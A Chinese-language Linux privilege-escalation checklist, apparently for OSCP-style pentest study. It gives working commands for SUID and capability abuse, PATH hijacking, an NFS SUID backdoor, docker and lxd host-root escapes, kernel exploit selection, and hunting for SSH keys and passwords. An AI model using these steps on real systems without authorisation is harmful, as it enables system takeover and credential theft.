# Linux 提权 checklist
## Reminders
- [ ] **先跑自动脚本**，再针对脚本提示逐条人工验证
	- [ ] linpeas.sh：`./linpeas.sh -a | tee linpeas.log`
	- [ ] LinEnum：`./LinEnum.sh -t -k keyword`
- [ ] 拿到低权限 shell 后**第一时间升级 TTY**，方便交互与 su/sudo
	```bash
	python3 -c 'import pty;pty.spawn("/bin/bash")'
	# Ctrl+Z 后
	stty raw -echo; fg; export TERM=xterm
	```
- [ ] 记录当前用户与系统信息，作为证据截图
	```bash
	id; whoami; hostname; uname -a; cat /etc/os-release
	```

## 基础信息收集
- [ ] 内核版本（找对应 exploit，注意架构 32/64）
	```bash
	uname -a; cat /proc/version; arch
	```
- [ ] 发行版与已装补丁
	```bash
	cat /etc/os-release; lsb_release -a 2>/dev/null
	```
- [ ] 环境变量里是否有敏感信息
	```bash
	env; set; cat /etc/environment
	```
- [ ] 当前 PATH 是否包含可写目录
	```bash
	echo $PATH | tr ':' '\n'
	```

## sudo 与 SUID
- [ ] `sudo -l` 查看可执行命令（非交互模式若需要密码会失败）
	```bash
	sudo -l
	```
- [ ] 查找 SUID/SGID 文件
	```bash
	find / -perm -4000 -type f 2>/dev/null
	find / -perm -2000 -type f 2>/dev/null
	```
- [ ] 查找可写的 SUID 文件
	```bash
	find / -perm -4000 -type f -writable 2>/dev/null
	```
- [ ] 对照 GTFOBins（https://gtfobins.github.io/）逐个验证 sudo 与 SUID 的利用方法
	- [ ] SUID 常见可滥用：`find / -exec`、`vim`、`bash -p`、`python`、`less/!sh`、`cp`（覆盖 /etc/passwd）、`tar`、`env`、`systemctl`

## capabilities
- [ ] 查询带 capabilities 的二进制（重点 cap_setuid、cap_dac_read_search、cap_sys_admin）
	```bash
	getcap -r / 2>/dev/null
	```
- [ ] 常见利用：`cap_setuid+ep` 的 python/perl 直接 setuid(0)、`cap_sys_admin` 挂载、`cap_dac_read_search` 读任意文件
	```bash
	# python cap_setuid 例子
	python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
	```

## cron 与定时任务
- [ ] 查看 root 与全局 crontab
	```bash
	cat /etc/crontab; ls -la /etc/cron.*
	```
- [ ] 查看各用户 crontab
	```bash
	ls -la /var/spool/cron/crontabs/ 2>/dev/null
	cat /var/spool/cron/* 2>/dev/null
	```
- [ ] 检查 cron 调用的脚本是否**可写**、是否缺绝对路径（PATH 劫持）、是否引用可写的二进制
	```bash
	ls -la /etc/cron* /var/spool/cron* 2>/dev/null
	grep -R "PATH" /etc/crontab /etc/cron.d/ 2>/dev/null
	```
- [ ] 用 pspy 观察 root 周期性执行的进程（无需 root 权限）
	```bash
	./pspy64 -pf -i 1000
	```

## PATH 劫持
- [ ] 找 root 调用的、用相对路径执行的命令（配合 cron/脚本审计）
- [ ] 在可写目录放同名恶意脚本，内容如：
	```bash
	cat > /tmp/<name> << 'EOF'
	#!/bin/bash
	/bin/bash -p
	EOF
	chmod +x /tmp/<name>
	```
- [ ] 把 /tmp 或可写目录加进 PATH 前段并触发

## NFS 与共享
- [ ] 查看 NFS 导出与挂载配置
	```bash
	showmount -e <target>; cat /etc/exports
	```
- [ ] 若发现 `no_root_squash`，用攻击机挂载并放 SUID 后门
	```bash
	# 攻击机
	mkdir /tmp/nfs && mount -t nfs <target>:/share /tmp/nfs
	cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash
	```
- [ ] 检查是否存在可写的共享目录挂载点
	```bash
	mount; cat /etc/fstab
	```

## docker / lxd / 容器逃逸
- [ ] 当前用户是否在 docker/lxd 组（可加载 root 文件系统）
	```bash
	id; groups
	```
- [ ] docker 组利用（挂载宿主机根目录）
	```bash
	docker run -v /:/mnt --rm -it alpine chroot /mnt sh
	```
- [ ] lxd 组利用（构建带特权容器镜像）
	```bash
	# 攻击机构建镜像后导入，再挂载宿主机 /
	lxc image import alpine.tar.gz --alias alpine
	lxc init alpine privesc -c security.privileged=true
	lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
	lxc start privesc && lxc exec privesc /bin/sh
	```

## 内核 exploit
- [ ] 用 uname 版本匹配已知漏洞（脏牛 dirtycow、overlayfs、pkexec/CVE-2021-4034 等）
	```bash
	uname -a
	```
- [ ] 优先找**稳定、已编译**的 PoC；上传前确认架构（`file` / `arch`）
- [ ] 用 `gcc` 或预编译二进制落地执行，注意别把系统打崩（OSCP 环境优先可逆方案）

## 历史文件与敏感文件
- [ ] bash/zsh 历史
	```bash
	cat ~/.bash_history; cat ~/.zsh_history; find / -name ".*_history" 2>/dev/null
	```
- [ ] SSH 私钥与 known_hosts
	```bash
	find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
	cat ~/.ssh/id_rsa; cat ~/.ssh/known_hosts; ls -la ~/.ssh/
	```
- [ ] 明文凭据：`password`、`passwd`、`secret`、`token`、`.env`、数据库连接串
	```bash
	grep -Ril "password" /home /var/www /opt /tmp 2>/dev/null
	find / -name "*.env" -o -name "*.conf" -o -name "*.config" 2>/dev/null
	```
- [ ] 配置文件（web 根、数据库、备份、Git）
	```bash
	find / -name "*.db" -o -name "*.sql" -o -name "*.bak" -o -name ".git" 2>/dev/null
	```
- [ ] 用户主目录可读权限检查（其他用户目录是否有私钥/凭据可读）
	```bash
	ls -la /home/; ls -la /root/ 2>/dev/null
	```

## 网络与进程
- [ ] 监听端口与服务版本
	```bash
	ss -tlnp; netstat -tulnp 2>/dev/null; ps aux
	```
- [ ] 只监听本地的服务（可用于端口转发/回环访问）
	```bash
	ss -tlnp | grep 127.0.0.1
	```
- [ ] 以 root 运行的进程及可写二进制替换
	```bash
	ps aux | grep root
	```
- [ ] 检查是否有其他用户在跑会话、可写脚本被高权限引用

## 自动脚本
- [ ] linpeas（全面，输出长，逐条核对）
	```bash
	curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
	chmod +x linpeas.sh && ./linpeas.sh -a | tee linpeas.log
	```
- [ ] pspy（无 root 观察进程/定时任务，抓 cron 与 SUID 触发）
	```bash
	./pspy64 -pf -i 1000
	```
- [ ] LinEnum（快速脚本）
	```bash
	./LinEnum.sh -t -k pass
	```
- [ ] GTFOBins（https://gtfobins.github.io/）——人工确认 sudo/SUID 利用手法
- [ ] PayloadsAllTheThings Linux 提权页（https://github.com/swisskyrepo/PayloadsAllTheThings）
